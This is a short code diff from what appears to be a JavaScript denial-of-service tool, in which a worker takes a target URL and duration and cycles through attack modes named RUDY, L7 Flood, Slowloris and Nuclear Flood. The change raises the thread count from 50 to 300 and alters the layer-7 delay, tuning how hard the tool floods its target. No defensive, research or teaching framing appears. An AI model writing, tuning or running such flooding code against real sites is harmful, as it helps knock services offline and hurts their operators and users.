@@ -398,8 +398,8 @@ class NuclearFlood extends L7Flood {
 }
 
 process.on('message', ({ targetUrl, duration }) => {
-    const threads = 50;
-    const l7Delay = 250;
+    const threads = 300;
+    const l7Delay = 500;
     const allAttackModes = ['RUDY', 'L7 Flood', 'Slowloris', 'Nuclear Flood'];
 
     // Shuffle attack order
